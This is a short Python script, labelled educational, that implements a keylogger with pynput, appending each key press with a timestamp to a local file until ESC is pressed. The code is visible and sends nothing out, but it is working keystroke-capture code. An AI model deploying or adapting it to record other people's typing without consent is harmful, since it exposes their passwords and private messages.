"""
Simple Keylogger – Educational Purpose Only
Logs every key press to a file until the ESC key is pressed.
"""

from pynput import keyboard
import datetime

# === Configuration ===
LOG_FILE = "keylog.txt"          # File where keystrokes are saved
STOP_KEY = keyboard.Key.esc       # Key to stop logging

def format_key(key):
    """
    Convert a pynput key object to a readable string.
    """
    if hasattr(key, 'char'):
        # Regular character key
        return key.char if key.char is not None else ''
    else:
        # Special key (e.g., shift, ctrl, space)
        # Return a descriptive name in angle brackets
        return f"<{key.name}>"

def on_press(key):
    """
    Callback function triggered on every key press.
    Writes the key to the log file with a timestamp.
    """
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            # Get current timestamp
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            # Format the key
            key_str = format_key(key)
            # Write to file: [time] key
            f.write(f"[{timestamp}] {key_str}\n")
            # Optionally, also print to console for debugging
            print(f"Logged: {key_str}")
    except Exception as e:
        print(f"Error writing to log: {e}")

    # Stop listener if STOP_KEY is pressed
    if key == STOP_KEY:
        print("\nStop key pressed. Exiting...")
        return False  # Stop the listener

def main():
    """
    Start the keyboard listener and keep it running until STOP_KEY.
    """
    print("Keylogger started.")
    print(f"Logging to: {LOG_FILE}")
    print(f"Press {STOP_KEY} to stop and exit.")

    # Create and start the listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Wait until the listener stops

    print("Keylogger stopped. Logs saved.")

if __name__ == "__main__":
    main()
